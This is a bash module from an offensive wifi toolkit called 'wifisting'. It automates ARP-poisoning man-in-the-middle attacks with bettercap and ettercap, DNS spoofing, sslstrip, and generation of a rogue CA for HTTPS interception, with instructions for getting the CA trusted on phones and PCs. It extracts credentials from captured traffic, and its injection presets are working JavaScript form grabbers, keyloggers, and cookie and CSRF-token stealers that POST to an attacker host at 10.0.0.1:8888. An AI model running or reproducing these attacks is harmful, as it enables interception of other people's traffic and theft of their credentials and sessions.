#!/usr/bin/env bash
# 07_arp.sh — ARP poisoning / MITM with dynamic HTTPS interception
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${CAPTURES_DIR:=$HOME/wifisting/captures}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
: "${WIFISTING_ROOT:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" 2>/dev/null

ARP_STATE_DIR="$TMP_DIR/arp"
ARP_LOOT_DIR="$LOOT_DIR/arp"
ARP_CA_DIR="${XDG_CONFIG_HOME:-$HOME/.config}/wifisting/ca"
ARP_CAPLET_DIR="${XDG_CONFIG_HOME:-$HOME/.config}/wifisting/caplets"
mkdir -p "$ARP_STATE_DIR" "$ARP_LOOT_DIR" "$ARP_CA_DIR" "$ARP_CAPLET_DIR"

export ARP_STATE_DIR ARP_LOOT_DIR

# ── interface + target ──

arp_pick_iface() {
    info "available interfaces with IPs:"
    ip -brief -4 addr show | grep -v "lo\|DOWN" | awk '{print NR") "$1" "$3}'
    echo ""
    read -rp "   iface name> " ARP_IFACE
    ip link show "$ARP_IFACE" >/dev/null 2>&1 || { err "not found"; return 1; }
    ARP_GATEWAY=$(ip route show dev "$ARP_IFACE" | awk '/default/ {print $3; exit}')
    ARP_LOCAL_IP=$(ip -4 addr show "$ARP_IFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -n1)
    ARP_SUBNET=$(ip -4 addr show "$ARP_IFACE" | awk '/inet / {print $2}' | head -n1)
    [[ -z "$ARP_GATEWAY" || -z "$ARP_LOCAL_IP" ]] && {
        err "can't derive gateway / local IP"; return 1; }
    export ARP_IFACE ARP_GATEWAY ARP_LOCAL_IP ARP_SUBNET
    printf '%s\n' "$ARP_IFACE"    > "$ARP_STATE_DIR/iface"
    printf '%s\n' "$ARP_GATEWAY"  > "$ARP_STATE_DIR/gateway"
    printf '%s\n' "$ARP_LOCAL_IP" > "$ARP_STATE_DIR/local_ip"
    ok "iface=$ARP_IFACE local=$ARP_LOCAL_IP gw=$ARP_GATEWAY"
}

arp_state_save() {
    mkdir -p "$ARP_STATE_DIR"
    [[ -n "${ARP_IFACE:-}"     ]] && printf '%s' "$ARP_IFACE"     > "$ARP_STATE_DIR/iface"
    [[ -n "${ARP_GATEWAY:-}"   ]] && printf '%s' "$ARP_GATEWAY"   > "$ARP_STATE_DIR/gateway"
    [[ -n "${ARP_LOCAL_IP:-}"  ]] && printf '%s' "$ARP_LOCAL_IP"  > "$ARP_STATE_DIR/local_ip"
    [[ -n "${ARP_SUBNET:-}"    ]] && printf '%s' "$ARP_SUBNET"    > "$ARP_STATE_DIR/subnet"
    [[ -n "${ARP_TARGET_IP:-}" ]] && printf '%s' "$ARP_TARGET_IP" > "$ARP_STATE_DIR/target"
}

arp_state_load() {
    [[ -z "${ARP_IFACE:-}"     && -f "$ARP_STATE_DIR/iface"     ]] && export ARP_IFACE="$(cat "$ARP_STATE_DIR/iface")"
    [[ -z "${ARP_GATEWAY:-}"   && -f "$ARP_STATE_DIR/gateway"   ]] && export ARP_GATEWAY="$(cat "$ARP_STATE_DIR/gateway")"
    [[ -z "${ARP_LOCAL_IP:-}"  && -f "$ARP_STATE_DIR/local_ip"  ]] && export ARP_LOCAL_IP="$(cat "$ARP_STATE_DIR/local_ip")"
    [[ -z "${ARP_SUBNET:-}"    && -f "$ARP_STATE_DIR/subnet"    ]] && export ARP_SUBNET="$(cat "$ARP_STATE_DIR/subnet")"
    [[ -z "${ARP_TARGET_IP:-}" && -f "$ARP_STATE_DIR/target"    ]] && export ARP_TARGET_IP="$(cat "$ARP_STATE_DIR/target")"
}

# ── dynamic CA generation ──
# bettercap can generate a per-target cert on the fly if we give it a CA
# in ~/.bettercap/certificate.pem + certificate.key. We generate one here
# the first time, reuse it after.
arp_ensure_ca() {
    command -v openssl >/dev/null || { err "openssl missing"; return 1; }

    local bc_dir="$HOME/.bettercap"
    mkdir -p "$bc_dir"

    if [[ -f "$bc_dir/certificate.pem" && -f "$bc_dir/certificate.key" ]]; then
        ok "bettercap CA already at $bc_dir"
        return 0
    fi

    info "generating CA for dynamic HTTPS interception"
    openssl genrsa -out "$bc_dir/certificate.key" 2048 >/dev/null 2>&1
    openssl req -new -x509 -days 3650 \
        -key "$bc_dir/certificate.key" \
        -out "$bc_dir/certificate.pem" \
        -subj "/C=US/O=wifisting/CN=wifisting-CA" \
        -extensions v3_ca \
        -config <(cat <<CFG
[req]
distinguished_name = req_dn
x509_extensions = v3_ca
[req_dn]
[v3_ca]
basicConstraints = critical,CA:TRUE,pathlen:0
keyUsage = critical,keyCertSign,cRLSign
subjectKeyIdentifier = hash
CFG
        ) >/dev/null 2>&1
    chmod 600 "$bc_dir/certificate.key"

    # Also drop a copy in the wifisting CA dir for install-scripts
    cp "$bc_dir/certificate.pem" "$ARP_CA_DIR/wifisting-ca.pem" 2>/dev/null || true
    ok "CA generated: $bc_dir/certificate.pem"
}

# ── caplet generation (with safe JS escaping) ──

# Escape a string for use as a JS string literal. Handles ", \, newline,
# CR, tab, and control chars.
arp_js_escape() {
    python3 - "$1" <<'PY'
import json, sys
print(json.dumps(sys.argv[1])[1:-1], end="")
PY
}

# Escape a string for inclusion in a sed replacement expression.
# The old module piped user strings straight into sed, which broke on
# any char that had special meaning for the regex or the replacement.
arp_sed_escape() {
    python3 - "$1" <<'PY'
import sys
s = sys.argv[1]
# escape every sed metachar in the pattern and backslash in the replacement
for ch in ["\\", "|", "&", "/", "[", "]", "(", ")", ".", "*", "+",
           "?", "^", "$", "{", "}", "\n"]:
    s = s.replace(ch, "\\" + ch)
print(s, end="")
PY
}

arp_caplet_prepare() {
    mkdir -p "$ARP_CAPLET_DIR" "$ARP_CA_DIR"
    [[ -f "$ARP_CAPLET_DIR/rules.tsv" ]] || : > "$ARP_CAPLET_DIR/rules.tsv"
    [[ -f "$ARP_CAPLET_DIR/inject.js" ]] || : > "$ARP_CAPLET_DIR/inject.js"
}

arp_rules_list() {
    arp_caplet_prepare
    local n=0
    while IFS=$'\t' read -r kind a b c; do
        [[ -z "$kind" ]] && continue
        n=$((n+1))
        printf '%s\t%s\t%s\t%s\t%s\n' "$n" "$kind" "$a" "${b:-}" "${c:-}"
    done < "$ARP_CAPLET_DIR/rules.tsv"
}

arp_rules_add() {
    arp_caplet_prepare
    local kind="$1" a="$2" b="${3:-}"
    [[ -z "$kind" || -z "$a" ]] && {
        printf 'ERR\tusage: --rules-add kind arg1 [arg2]\n' >&2; return 2; }
    case "$kind" in
        redirect|header-req|header-resp) ;;
        *) printf 'ERR\tunknown rule kind: %s\n' "$kind" >&2; return 2 ;;
    esac
    printf '%s\t%s\t%s\n' "$kind" "$a" "$b" >> "$ARP_CAPLET_DIR/rules.tsv"
    printf 'ADDED\t%s\t%s\t%s\n' "$kind" "$a" "$b"
}

arp_rules_del() {
    arp_caplet_prepare
    local n="$1"
    [[ -z "$n" ]] && { printf 'ERR\tmissing rule number\n' >&2; return 2; }
    awk -v n="$n" 'BEGIN{c=0} {c++; if (c!=n) print}' \
        "$ARP_CAPLET_DIR/rules.tsv" > "$ARP_CAPLET_DIR/rules.tsv.tmp"
    mv "$ARP_CAPLET_DIR/rules.tsv.tmp" "$ARP_CAPLET_DIR/rules.tsv"
    printf 'DELETED\t%s\n' "$n"
}

arp_rules_clear() {
    arp_caplet_prepare
    : > "$ARP_CAPLET_DIR/rules.tsv"
    printf 'CLEARED\n'
}

arp_inject_show()  { arp_caplet_prepare; cat "$ARP_CAPLET_DIR/inject.js"; }
arp_inject_clear() { arp_caplet_prepare; : > "$ARP_CAPLET_DIR/inject.js"; printf 'CLEARED\n'; }

arp_inject_save() {
    arp_caplet_prepare
    cat > "$ARP_CAPLET_DIR/inject.js"
    printf 'SAVED\t%s\t%s\n' \
        "$ARP_CAPLET_DIR/inject.js" "$(wc -c < "$ARP_CAPLET_DIR/inject.js")"
}

arp_inject_presets() {
    cat <<'PRESETS'
form-grabber	Capture all form submissions
keylogger	Capture all keystrokes
clipboard	Intercept clipboard writes
alert	Alert on every page
redirect	Replace page with message
csrf	Harvest CSRF tokens
webrtc-ip	Leak client LAN IP
screen-res	Fingerprint screen
cookie-dump	Dump document.cookie
none	Empty script
PRESETS
}

arp_inject_preset_get() {
    local name="$1"
    case "$name" in
        form-grabber) cat <<'JS'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') < 0) return;
    res.Body = res.Body.replace('</body>',
        '<script>(function(){document.addEventListener("submit",function(e){' +
        'var f=e.target,o={url:location.href,action:f.action};' +
        'for(var i=0;i<f.elements.length;i++){var el=f.elements[i];' +
        'if(!el.name)continue;o[el.name]=el.value;}' +
        'fetch("http://10.0.0.1:8888/post",{method:"POST",' +
        'headers:{"Content-Type":"application/json"},body:JSON.stringify(o)});' +
        '},true);})();</script></body>');
}
JS
            ;;
        keylogger) cat <<'JS'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') < 0) return;
    res.Body = res.Body.replace('</body>',
        '<script>(function(){var b="";' +
        'document.addEventListener("keypress",function(e){' +
        'b+=String.fromCharCode(e.which);' +
        'fetch("http://10.0.0.1:8888/log",{method:"POST",body:b+"|"+location.href});});' +
        '})();</script></body>');
}
JS
            ;;
        clipboard) cat <<'JS'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') < 0) return;
    res.Body = res.Body.replace('</body>',
        '<script>document.addEventListener("copy",function(){' +
        'var t=window.getSelection().toString();' +
        'fetch("http://10.0.0.1:8888/copy",{method:"POST",body:t});});' +
        '</script></body>');
}
JS
            ;;
        alert) cat <<'JS'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') < 0) return;
    res.Body = res.Body.replace('</body>',
        '<script>alert("wifisting");</script></body>');
}
JS
            ;;
        redirect) cat <<'JS'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') < 0) return;
    res.Body = '<html><body style="background:#111;color:#f33;' +
        'font-family:monospace;font-size:22px;padding:40px">' +
        '<h1>Intercepted</h1><p>Replaced by wifisting.</p></body></html>';
}
JS
            ;;
        csrf) cat <<'JS'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') < 0) return;
    res.Body = res.Body.replace('</body>',
        '<script>(function(){var t=[];' +
        'document.querySelectorAll("input[type=hidden]").forEach(function(i){' +
        'if(/csrf|token/i.test(i.name))t.push({n:i.name,v:i.value});});' +
        'if(t.length)fetch("http://10.0.0.1:8888/csrf",{method:"POST",' +
        'body:JSON.stringify({u:location.href,t:t})});})();</script></body>');
}
JS
            ;;
        webrtc-ip) cat <<'JS'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') < 0) return;
    res.Body = res.Body.replace('</body>',
        '<script>(function(){var p=new RTCPeerConnection({iceServers:[]});' +
        'p.createDataChannel("");p.onicecandidate=function(e){' +
        'if(!e.candidate)return;' +
        'fetch("http://10.0.0.1:8888/ip",{method:"POST",body:e.candidate.candidate});};' +
        'p.createOffer().then(function(o){p.setLocalDescription(o)});})();' +
        '</script></body>');
}
JS
            ;;
        screen-res) cat <<'JS'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') < 0) return;
    res.Body = res.Body.replace('</body>',
        '<script>fetch("http://10.0.0.1:8888/res",{method:"POST",' +
        'body:JSON.stringify({w:screen.width,h:screen.height,d:devicePixelRatio,' +
        'c:navigator.hardwareConcurrency,p:navigator.platform,u:navigator.userAgent})});' +
        '</script></body>');
}
JS
            ;;
        cookie-dump) cat <<'JS'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') < 0) return;
    res.Body = res.Body.replace('</body>',
        '<script>if(document.cookie)fetch("http://10.0.0.1:8888/ck",' +
        '{method:"POST",body:document.cookie});</script></body>');
}
JS
            ;;
        none) printf '// empty\n' ;;
        *) printf 'ERR\tunknown preset: %s\n' "$name" >&2; return 1 ;;
    esac
}

# ── caplet build with FIXED JS escaping ──

arp_caplet_build() {
    arp_caplet_prepare
    local iface="${1:-}"
    local target="${2:-}"
    local loot="${3:-$ARP_LOOT_DIR}"

    local js="$ARP_CAPLET_DIR/generated.js"

    # Read rules and emit a JS proxy script. Proper escaping via
    # arp_js_escape — the old sed-based version mangled any rule that
    # contained a paren, bracket, or pipe.
    {
        printf '// wifisting generated proxy script\n\n'
        printf 'var __redirects = [];\nvar __hdr_req = [];\nvar __hdr_resp = [];\n\n'

        while IFS=$'\t' read -r kind a b; do
            [[ -z "$kind" ]] && continue
            local a_e b_e
            a_e=$(arp_js_escape "$a")
            b_e=$(arp_js_escape "$b")
            case "$kind" in
                redirect)
                    printf '__redirects.push([/%s/, "%s"]);\n' "$a_e" "$b_e"
                    ;;
                header-req)
                    printf '__hdr_req.push(["%s", "%s"]);\n' "$a_e" "$b_e"
                    ;;
                header-resp)
                    printf '__hdr_resp.push(["%s", "%s"]);\n' "$a_e" "$b_e"
                    ;;
            esac
        done < "$ARP_CAPLET_DIR/rules.tsv"

        printf '\nfunction onRequest(req, ctx) {\n'
        printf '    for (var i = 0; i < __redirects.length; i++) {\n'
        printf '        if (__redirects[i][0].test(req.FullURL)) {\n'
        printf '            req.FullURL = req.FullURL.replace(__redirects[i][0], __redirects[i][1]);\n'
        printf '            req.Path = req.FullURL.replace(/^https?:\\/\\/[^\\/]+/, "");\n'
        printf '            break;\n'
        printf '        }\n    }\n'
        printf '    for (var j = 0; j < __hdr_req.length; j++) {\n'
        printf '        req.SetHeader(__hdr_req[j][0], __hdr_req[j][1]);\n    }\n'
        printf '}\n\n'

        printf 'function onResponse(req, res) {\n'
        printf '    for (var i = 0; i < __hdr_resp.length; i++) {\n'
        printf '        res.SetHeader(__hdr_resp[i][0], __hdr_resp[i][1]);\n    }\n'
        printf '}\n\n'

        if [[ -s "$ARP_CAPLET_DIR/inject.js" ]]; then
            printf '// ---- user injection ----\n'
            cat "$ARP_CAPLET_DIR/inject.js"
        fi
    } > "$js"

    local merged="$ARP_CAPLET_DIR/merged.cap"
    {
        printf '# wifisting merged caplet — %s\n' "$(date -Is)"
        printf 'set http.proxy.script %s\n' "$js"
        printf 'set http.proxy.sslstrip true\n'
        # HTTP/2 awareness: caplet can force HTTP/1.1 downgrade so the
        # proxy sees the traffic. Bettercap 2.x uses this key.
        printf 'set http.proxy.sslstrip.keepalive false\n'
        if [[ -n "$target" ]]; then
            printf 'set arp.spoof.targets %s\n' "$target"
            printf 'set arp.spoof.internal true\n'
            printf 'set arp.spoof.fullduplex true\n'
        fi
        printf 'set net.sniff.output %s/sniff_%s.pcap\n' "$loot" "$(date +%s)"
        printf 'set net.sniff.verbose true\n'
        printf 'arp.spoof on\nnet.sniff on\nhttp.proxy on\n'
    } > "$merged"

    printf 'CAPLET\t%s\nJS\t%s\n' "$merged" "$js"
}

arp_caplet_show() {
    arp_caplet_prepare
    if [[ -f "$ARP_CAPLET_DIR/merged.cap" ]]; then
        cat "$ARP_CAPLET_DIR/merged.cap"
    else
        printf '# no caplet yet\n'
    fi
}

arp_caplet_restart() {
    local iface="$1" target="${2:-}"
    arp_caplet_build "$iface" "$target" >/dev/null
    arp_ensure_ca

    if [[ -f "$ARP_STATE_DIR/current.pid" ]]; then
        kill "$(cat "$ARP_STATE_DIR/current.pid")" 2>/dev/null
        rm -f "$ARP_STATE_DIR/current.pid"
    fi
    pkill -f "bettercap -iface" 2>/dev/null
    sleep 1

    command -v bettercap >/dev/null || {
        printf 'ERR\tbettercap missing\n' >&2; return 1; }

    local logf="$LOGS_DIR/arp_bettercap_$(date +%s).log"
    nohup bettercap -iface "$iface" -caplet "$ARP_CAPLET_DIR/merged.cap" \
        > "$logf" 2>&1 &
    echo $! > "$ARP_STATE_DIR/current.pid"
    printf 'bettercap\n' > "$ARP_STATE_DIR/current_mode"
    printf 'RESTARTED\t%s\nLOG\t%s\nCAPLET\t%s\n' \
        "$(cat "$ARP_STATE_DIR/current.pid")" "$logf" \
        "$ARP_CAPLET_DIR/merged.cap"
}

# ── MITM start / stop ──

arp_cli_start_mitm_bettercap() {
    arp_state_load
    [[ -z "${ARP_IFACE:-}"     ]] && { printf 'no iface\n' >&2; return 1; }
    [[ -z "${ARP_TARGET_IP:-}" ]] && { printf 'no target\n' >&2; return 1; }
    command -v bettercap >/dev/null || { printf 'bettercap missing\n' >&2; return 1; }

    arp_ensure_ca
    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    mkdir -p "$ARP_LOOT_DIR"

    local caplet="$ARP_STATE_DIR/mitm.cap"
    cat > "$caplet" <<EOF
set arp.spoof.targets $ARP_TARGET_IP
set arp.spoof.internal true
set arp.spoof.fullduplex true
set net.sniff.output $ARP_LOOT_DIR/sniff_$(date +%s).pcap
set net.sniff.verbose true
set http.proxy.sslstrip true
arp.spoof on
net.sniff on
http.proxy on
EOF

    local logf="$LOGS_DIR/arp_bettercap_$(date +%s).log"
    nohup bettercap -iface "$ARP_IFACE" -caplet "$caplet" \
        > "$logf" 2>&1 &
    echo $! > "$ARP_STATE_DIR/current.pid"
    printf 'bettercap\n' > "$ARP_STATE_DIR/current_mode"
    printf 'STARTED\t%s\nLOG\t%s\n' "$(cat "$ARP_STATE_DIR/current.pid")" "$logf"
}

arp_cli_start_mitm_ettercap() {
    arp_state_load
    [[ -z "${ARP_IFACE:-}"     ]] && { printf 'no iface\n' >&2; return 1; }
    [[ -z "${ARP_TARGET_IP:-}" ]] && { printf 'no target\n' >&2; return 1; }
    command -v ettercap >/dev/null || { printf 'ettercap missing\n' >&2; return 1; }

    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    local logf="$LOGS_DIR/arp_ettercap_$(date +%s).log"
    nohup ettercap -T -q -i "$ARP_IFACE" \
        -M arp:remote "/$ARP_TARGET_IP//" "/$ARP_GATEWAY//" \
        > "$logf" 2>&1 &
    echo $! > "$ARP_STATE_DIR/current.pid"
    printf 'ettercap\n' > "$ARP_STATE_DIR/current_mode"
    printf 'STARTED\t%s\nLOG\t%s\n' "$(cat "$ARP_STATE_DIR/current.pid")" "$logf"
}

arp_cli_stop() {
    arp_state_load
    local killed=0 pid=""
    [[ -f "$ARP_STATE_DIR/current.pid" ]] && \
        pid=$(cat "$ARP_STATE_DIR/current.pid")
    if [[ -n "$pid" ]]; then
        stop_kill_pid "$pid" && killed=1
    fi
    stop_sweep "bettercap -iface" && killed=1
    stop_sweep "ettercap" && killed=1
    sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1
    if (( killed == 1 )) || [[ -z "$pid" ]]; then
        rm -f "$ARP_STATE_DIR/current.pid" "$ARP_STATE_DIR/current_mode"
        printf 'STOPPED\n'
        return 0
    fi
    printf 'ERROR\tMITM pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
    return 1
}

# ── iface / scan / hosts ──

arp_cli_list_ifaces_tsv() {
    local name ip4
    while read -r name; do
        [[ -z "$name" ]] && continue
        ip4="$(ip -4 addr show "$name" 2>/dev/null | awk '/inet /{print $2}' | head -1)"
        printf '%s\t%s\n' "$name" "${ip4:-no-ip}"
    done < <(ls /sys/class/net/ | grep -Ev '^(lo|docker|veth|br-|virbr)')
}

arp_cli_status_tsv() {
    arp_state_load
    local running=0 pid=""
    if [[ -f "$ARP_STATE_DIR/current.pid" ]]; then
        pid=$(cat "$ARP_STATE_DIR/current.pid")
        # /proc, NOT kill -0: the MITM runs under pkexec as root, and
        # kill -0 returns EPERM for a root-owned process when the caller is
        # not root. That EPERM made a live bettercap report running=0, so the
        # GUI status pill sat at "idle" while the attack was working.
        [[ -d "/proc/$pid" ]] && running=1
    fi
    # Fall back to discovery. The launch goes through pkexec and nohup, and
    # $! across that layering is not reliably the tool's own pid: a live
    # bettercap with a stale pidfile reported running=0 and the GUI status
    # pill sat at "idle" while the MITM was in fact spoofing. Match the
    # process by the caplet it was started with instead.
    # pgrep -x (exact name) so the pattern cannot match this shell, and
    # /proc for liveness so root-owned processes are not seen as dead.
    if (( running == 0 )); then
        local bp
        for bp in $(pgrep -x bettercap 2>/dev/null); do
            if tr '\0' ' ' < "/proc/$bp/cmdline" 2>/dev/null \
                 | grep -q -- "$ARP_STATE_DIR/mitm.cap"; then
                running=1; pid="$bp"; break
            fi
        done
        for bp in $(pgrep -x ettercap 2>/dev/null); do
            if tr '\0' ' ' < "/proc/$bp/cmdline" 2>/dev/null \
                 | grep -q -- "$ARP_IFACE"; then
                running=1; pid="$bp"; break
            fi
        done
    fi
    local mode=""
    [[ -f "$ARP_STATE_DIR/current_mode" ]] && mode=$(cat "$ARP_STATE_DIR/current_mode")
    printf 'iface\t%s\n'      "${ARP_IFACE:-}"
    printf 'gateway\t%s\n'    "${ARP_GATEWAY:-}"
    printf 'local_ip\t%s\n'   "${ARP_LOCAL_IP:-}"
    printf 'subnet\t%s\n'     "${ARP_SUBNET:-}"
    printf 'target\t%s\n'     "${ARP_TARGET_IP:-}"
    printf 'running\t%s\n'    "$running"
    printf 'mode\t%s\n'       "$mode"
    printf 'hosts_file\t%s\n' "$ARP_STATE_DIR/hosts.tsv"
    printf 'loot_dir\t%s\n'   "$ARP_LOOT_DIR"
    printf 'ca_ready\t%s\n'   "$([[ -f "$HOME/.bettercap/certificate.pem" ]] && echo yes || echo no)"
}

arp_cli_set_iface() {
    local iface="$1"
    [[ -z "$iface" ]] && { printf 'missing iface\n' >&2; return 2; }
    ip link show "$iface" >/dev/null 2>&1 || {
        printf 'iface %s not found\n' "$iface" >&2; return 1; }
    ARP_IFACE="$iface"
    ARP_GATEWAY=$(ip route show dev "$iface" | awk '/default/ {print $3; exit}')
    ARP_LOCAL_IP=$(ip -4 addr show "$iface" | awk '/inet / {print $2}' | cut -d/ -f1 | head -n1)
    ARP_SUBNET=$(ip -4 addr show "$iface" | awk '/inet / {print $2}' | head -n1)
    export ARP_IFACE ARP_GATEWAY ARP_LOCAL_IP ARP_SUBNET
    arp_state_save
    printf 'IFACE\t%s\nGATEWAY\t%s\nLOCAL\t%s\nSUBNET\t%s\n' \
        "$ARP_IFACE" "$ARP_GATEWAY" "$ARP_LOCAL_IP" "$ARP_SUBNET"
}

arp_cli_scan_hosts() {
    arp_state_load
    [[ -z "${ARP_IFACE:-}" ]] && { printf 'no iface set\n' >&2; return 1; }
    mkdir -p "$ARP_STATE_DIR"
    arp-scan --interface="$ARP_IFACE" --localnet 2>/dev/null | \
        grep -E "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | \
        awk '{printf "%s\t%s\t%s\n", $1, $2, substr($0, index($0,$3))}' \
        > "$ARP_STATE_DIR/hosts.tsv"
    cat "$ARP_STATE_DIR/hosts.tsv"
}

arp_cli_list_hosts_tsv() {
    local f="$ARP_STATE_DIR/hosts.tsv"
    [[ -f "$f" ]] && cat "$f"
}

arp_cli_set_target() {
    local ip="$1"
    [[ -z "$ip" ]] && { printf 'missing ip\n' >&2; return 2; }
    ARP_TARGET_IP="$ip"
    export ARP_TARGET_IP
    arp_state_save
    printf 'TARGET\t%s\n' "$ARP_TARGET_IP"
}

# ── dns spoof ──

arp_cli_dns_spoof() {
    local domain="$1" redir="$2"
    arp_state_load
    [[ -z "$domain" ]] && { printf 'missing domain\n' >&2; return 2; }
    [[ -z "${ARP_TARGET_IP:-}" ]] && { printf 'no target\n' >&2; return 1; }
    [[ -z "$redir" ]] && redir="${ARP_LOCAL_IP:-10.0.0.1}"

    local caplet="$ARP_STATE_DIR/dns_spoof.cap"
    cat > "$caplet" <<EOF
set dns.spoof.domains $domain
set dns.spoof.address $redir
set arp.spoof.targets $ARP_TARGET_IP
set arp.spoof.fullduplex true
arp.spoof on
dns.spoof on
EOF
    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    local logf="$LOGS_DIR/arp_dnsspoof_$(date +%s).log"
    nohup bettercap -iface "$ARP_IFACE" -caplet "$caplet" \
        > "$logf" 2>&1 &
    echo $! > "$ARP_STATE_DIR/current.pid"
    printf 'dns-spoof\n' > "$ARP_STATE_DIR/current_mode"
    printf 'STARTED\t%s\n' "$(cat "$ARP_STATE_DIR/current.pid")"
}

# ── sniff / extract ──

arp_cli_sniff() {
    arp_state_load
    [[ -z "${ARP_IFACE:-}" ]] && { printf 'no iface\n' >&2; return 1; }
    local pcap="$ARP_LOOT_DIR/passive_$(date +%s).pcap"
    local dur="${1:-60}"
    info "capturing $ARP_IFACE for ${dur}s → $pcap"
    # Add QUIC detection: UDP 443 (many modern connections use QUIC and
    # bypass the HTTP proxy entirely)
    timeout "$dur" tcpdump -i "$ARP_IFACE" -w "$pcap" -U \
        'tcp port 80 or tcp port 443 or udp port 53 or tcp port 21 or tcp port 23 or udp port 443' \
        2>/dev/null
    [[ -f "$pcap" ]] && printf 'PCAP\t%s\n' "$pcap"
}

arp_cli_extract_creds() {
    local pcap="$1"
    [[ -z "$pcap" ]] && pcap=$(ls -t "$ARP_LOOT_DIR"/*.pcap 2>/dev/null | head -n1)
    [[ -z "$pcap" || ! -f "$pcap" ]] && { printf 'no pcap\n' >&2; return 1; }
    local out="$ARP_LOOT_DIR/creds_$(date +%s).txt"
    if command -v net-creds >/dev/null 2>&1; then
        net-creds -f "$pcap" | tee "$out"
    elif command -v pcredz >/dev/null 2>&1; then
        pcredz -f "$pcap" | tee "$out"
    else
        command -v tshark >/dev/null || { printf 'tshark missing\n' >&2; return 1; }
        tshark -r "$pcap" -Y \
            "http.authorization or http.request.method==POST or ftp.request.command==USER or ftp.request.command==PASS" \
            -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri \
            -e http.authorization 2>/dev/null | tee "$out"
    fi
    printf 'OUT\t%s\n' "$out"
}

# ── CA helpers ──

arp_ca_status() {
    local bc_ca="$HOME/.bettercap/certificate.pem"
    if [[ -f "$bc_ca" ]]; then
        printf 'source\tbettercap\npath\t%s\nsize\t%s\n' \
            "$bc_ca" "$(stat -c%s "$bc_ca")"
    elif [[ -f "$ARP_CA_DIR/wifisting-ca.pem" ]]; then
        printf 'source\twifisting\npath\t%s\nsize\t%s\n' \
            "$ARP_CA_DIR/wifisting-ca.pem" "$(stat -c%s "$ARP_CA_DIR/wifisting-ca.pem")"
    else
        printf 'source\tnone\npath\t\nsize\t0\n'
    fi
}

arp_ca_generate() {
    local cn="${1:-wifisting.local}"
    mkdir -p "$ARP_CA_DIR"

    if [[ -f "$ARP_CA_DIR/wifisting-ca.pem" ]]; then
        printf 'EXISTS\t%s\n' "$ARP_CA_DIR/wifisting-ca.pem"
        return 0
    fi
    command -v openssl >/dev/null || { printf 'openssl missing\n'; return 1; }

    openssl genrsa -out "$ARP_CA_DIR/wifisting-ca.key" 2048 >/dev/null 2>&1
    openssl req -new -x509 -days 3650 \
        -key "$ARP_CA_DIR/wifisting-ca.key" \
        -out "$ARP_CA_DIR/wifisting-ca.pem" \
        -subj "/CN=$cn" \
        -extensions v3_ca \
        -config <(cat <<CFG
[req]
distinguished_name = req_dn
x509_extensions = v3_ca
[req_dn]
[v3_ca]
basicConstraints = critical,CA:TRUE,pathlen:0
keyUsage = critical,keyCertSign,cRLSign
CFG
        ) >/dev/null 2>&1
    chmod 600 "$ARP_CA_DIR/wifisting-ca.key"
    printf 'GENERATED\t%s\n' "$ARP_CA_DIR/wifisting-ca.pem"
}

arp_ca_serve_info() {
    local ca=""
    if [[ -f "$HOME/.bettercap/certificate.pem" ]]; then
        ca="$HOME/.bettercap/certificate.pem"
    elif [[ -f "$ARP_CA_DIR/wifisting-ca.pem" ]]; then
        ca="$ARP_CA_DIR/wifisting-ca.pem"
    else
        printf 'ERR\tno CA — run --ca-generate first\n' >&2
        return 1
    fi
    printf 'CA_PATH\t%s\n' "$ca"
    printf 'SERVE_HINT\tpython3 -m http.server 8888 --directory %s\n' "$(dirname "$ca")"
    printf '\nINSTALL INSTRUCTIONS\n====================\n\n'
    printf 'iOS:\n  1. Open http://10.0.0.1:8888/certificate.pem in Safari\n'
    printf '  2. Settings > General > VPN & Device Management > Install Profile\n'
    printf '  3. Settings > General > About > Certificate Trust Settings > enable\n\n'
    printf 'Android (7+):\n  1. Download certificate.pem\n'
    printf '  2. Settings > Security > Encryption & credentials > Install cert\n'
    printf '  3. CA certificate — apps can opt out (Firefox works, Chrome pins)\n\n'
    printf 'Windows: right-click > Install Certificate > Local Machine > Trusted Root\n'
